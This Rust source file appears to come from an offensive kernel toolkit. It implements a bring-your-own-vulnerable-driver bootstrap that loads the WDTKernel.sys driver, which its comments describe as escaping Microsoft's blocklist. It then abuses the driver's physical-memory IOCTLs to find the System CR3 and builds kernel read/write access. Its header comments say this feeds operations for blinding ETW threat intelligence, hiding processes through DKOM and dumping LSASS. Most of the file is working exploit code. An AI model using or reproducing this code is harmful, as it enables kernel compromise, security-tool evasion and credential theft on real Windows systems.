//! WDTKernel.sys phys-mode bootstrap — the blocklist-safe BYOVD path.
//!
//! WDTKernel (Dell Watchdog Timer, LOLDrivers #290) is WHQL-signed and NOT
//! on Microsoft's vulnerable-driver blocklist (`LoadsDespiteHVCI: TRUE`) — it
//! loads where blocklisted drivers cannot (`NtLoadDriver` 0xC0000034 /
//! 0xC0000428 on hardened hosts, verified on the GitHub windows-2022 image
//! 2026-08-13). Its primitive is PHYSICAL-only: every IOCTL feeds a
//! user-supplied physical address straight to `MmMapIoSpace`. This module:
//!   1. loads the driver and opens `\\.\__WDT__`,
//!   2. discovers the System process CR3 by scanning physical memory for the
//!      System EPROCESS (`System\0` ImageFileName at the table-verified
//!      offset, pool-aligned candidate, UniqueProcessId == 4) and reading
//!      `_KPROCESS.DirectoryTableBase` (+0x28 — x64-stable across
//!      10240–26200; KPROCESS is ABI-frozen, the pg-pdb-verify pass reads
//!      the same value from the real ntkrnlmp.pdb),
//!   3. validates each candidate CR3 by page-walking the ntoskrnl base VA
//!      through it and requiring `MZ` at the resolved physical page (false
//!      positive probability ≈ 0),
//!   4. wraps the physical primitive in [`VaKernelRw`] (4-level VA→PA walk)
//!      so the standard tier ops (assess / ETW-TI blind / DKOM hide / LSASS
//!      dump) run unchanged.
//!
//! ## Failure model
//! Every stage degrades to a named error — never a silent wrong read: the
//! CR3 validation gate means a bogus DirectoryTableBase is discarded, not
//! fed to the walk (mapping garbage physical addresses is a BSOD path).
#![cfg(target_os = "windows")]

use crate::byovd::{resolve_sym, DeviceIoControlFn, VulnDriverIoctl};
use crate::byovd_drivers::wdtkernel::WdtKernel;
use crate::offsets::EprocessOffsets;
use crate::win::driver_load::LoadedDriver;
use crate::win::pagewalk::{PhysRead, PhysReadError};
use crate::win::va_rw::{PhysWrite, VaKernelRw};
use crate::{KitError, KrwError};
use core::ffi::c_void;

/// The CR3 scan is a pure algorithm in [`crate::cr3_scan`] (host-testable);
/// re-exported here so `win::wdt::discover_system_cr3` keeps working with a
/// live `WdtPhys` (`WdtPhys: PhysRead`).
pub use crate::cr3_scan::discover_system_cr3;

/// Cap per-IOCTL transfer — keeps the driver's MmMapIoSpace mappings small.
const IOCTL_CHUNK: usize = 0x40000;

/// GENERIC_READ | GENERIC_WRITE.
const GENERIC_RW: u32 = 0xC000_0000;
const OPEN_EXISTING: u32 = 3;
const INVALID_HANDLE: *mut c_void = (-1isize) as *mut c_void;

type CreateFileWFn = unsafe extern "system" fn(
    *const u16,
    u32,
    u32,
    *mut c_void,
    u32,
    u32,
    *mut c_void,
) -> *mut c_void;
type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

/// Physical-memory R/W primitive over a live `\\.\__WDT__` handle.
pub struct WdtPhys {
    device: *mut c_void,
    dioctl: DeviceIoControlFn,
    close: CloseHandleFn,
}

// Raw handle + raw fn pointers; the handle is owned exclusively by this
// struct and the fns are immutable kernel32 code addresses.
unsafe impl Send for WdtPhys {}
unsafe impl Sync for WdtPhys {}

impl Drop for WdtPhys {
    fn drop(&mut self) {
        unsafe {
            (self.close)(self.device);
        }
    }
}

impl WdtPhys {
    /// Chunked physical read (bounded per-IOCTL transfer).
    fn read_at(&self, pa: u64, dst: &mut [u8]) -> Result<(), KrwError> {
        for (i, part) in dst.chunks_mut(IOCTL_CHUNK).enumerate() {
            let off = (i as u64).saturating_mul(IOCTL_CHUNK as u64);
            unsafe {
                WdtKernel::phys_read(self.device, self.dioctl, pa + off, part)?;
            }
        }
        Ok(())
    }

    /// Chunked physical write (bounded per-IOCTL transfer).
    fn write_at(&self, pa: u64, src: &[u8]) -> Result<(), KrwError> {
        for (i, part) in src.chunks(IOCTL_CHUNK).enumerate() {
            let off = (i as u64).saturating_mul(IOCTL_CHUNK as u64);
            unsafe {
                WdtKernel::phys_write(self.device, self.dioctl, pa + off, part)?;
            }
        }
        Ok(())
    }
}

impl PhysRead for WdtPhys {
    fn read_phys(&self, pa: u64, dst: &mut [u8]) -> Result<(), PhysReadError> {
        self.read_at(pa, dst).map_err(|_| PhysReadError::Ioctl)
    }
}

impl PhysWrite for WdtPhys {
    fn write_phys(&self, pa: u64, src: &[u8]) -> Result<(), PhysReadError> {
        self.write_at(pa, src).map_err(|_| PhysReadError::Ioctl)
    }
}

/// Open `\\.\__WDT__` and resolve the raw Win32 functions.
///
/// # Safety
/// The device must exist (driver loaded). BSOD-free: open-only.
pub unsafe fn open_wdt() -> Result<WdtPhys, KrwError> {
    let create_file = resolve_sym::<CreateFileWFn>(b"kernel32.dll", b"CreateFileW")?;
    let dioctl = resolve_sym::<DeviceIoControlFn>(b"kernel32.dll", b"DeviceIoControl")?;
    let close = resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle")?;

    // The device_path static is 11 code units WITHOUT a NUL (CreateFileW
    // reads until NUL — the byovd.rs open path documents the same hazard).
    let mut path_buf = [0u16; 12];
    path_buf[..11].copy_from_slice(WdtKernel.device_path());

    let device = unsafe {
        create_file(
            path_buf.as_ptr(),
            GENERIC_RW,
            0,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            core::ptr::null_mut(),
        )
    };
    if device == INVALID_HANDLE {
        return Err(KrwError::Other(
            "WDT open \\\\.\\__WDT__ failed (driver loaded?)".into(),
        ));
    }
    Ok(WdtPhys {
        device,
        dioctl,
        close,
    })
}

/// Full WDT phys-mode bootstrap: load driver → open device → discover CR3 →
/// wrap in [`VaKernelRw`]. Returns the loaded driver (cleanup) plus the
/// VA-capable `KernelRw`.
///
/// `scan_budget_mb` is the upper MiB bound for physical memory scanning when
/// discovering the System process CR3 (default 2048).
///
/// # Safety
/// Loads a kernel driver and opens its device. BSOD risk only through the
/// returned rw (never during bootstrap — every stage degrades to an error).
pub unsafe fn bootstrap_wdt(
    sys_path: &[u16],
    svc_name: &[u16],
    nt_base: u64,
    eprocess: &EprocessOffsets,
    scan_budget_mb: usize,
) -> Result<(LoadedDriver, VaKernelRw<WdtPhys>), KitError> {
    unsafe {
        bootstrap_phys_with(
            sys_path,
            svc_name,
            nt_base,
            eprocess,
            scan_budget_mb,
            open_wdt,
        )
    }
}

/// Generic physical-mode BYOVD bootstrap — the shared skeleton for every
/// phys-only driver (WDTKernel, ALSysIO64, …): load driver → `open_fn()`
/// the device → discover System CR3 (physical scan + MZ-validated page walk)
/// → wrap in [`VaKernelRw`]. Any stage failure unloads the driver before
/// returning the error, so a failed bootstrap leaves no loaded-driver
/// residue.
///
/// # Safety
/// Loads a kernel driver and opens its device. Same BSOD contract as
/// [`bootstrap_wdt`]: risk lives only in the returned rw.
pub unsafe fn bootstrap_phys_with<P: PhysRead + PhysWrite>(
    sys_path: &[u16],
    svc_name: &[u16],
    nt_base: u64,
    eprocess: &EprocessOffsets,
    scan_budget_mb: usize,
    open_fn: unsafe fn() -> Result<P, KrwError>,
) -> Result<(LoadedDriver, VaKernelRw<P>), KitError> {
    let loaded = unsafe { LoadedDriver::load(sys_path, svc_name) }
        .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;

    let phys = match unsafe { open_fn() } {
        Ok(p) => p,
        Err(e) => {
            let mut l = loaded;
            l.unload();
            return Err(KitError::Other(alloc::format!("phys device open: {}", e)));
        }
    };

    let cr3 = match discover_system_cr3(&phys, nt_base, eprocess, scan_budget_mb) {
        Some(c) => c,
        None => {
            let mut l = loaded;
            l.unload();
            return Err(KitError::Other(
                "cr3 discovery failed (scan budget exhausted, no validated candidate)".into(),
            ));
        }
    };

    Ok((loaded, VaKernelRw::new(phys, cr3)))
}
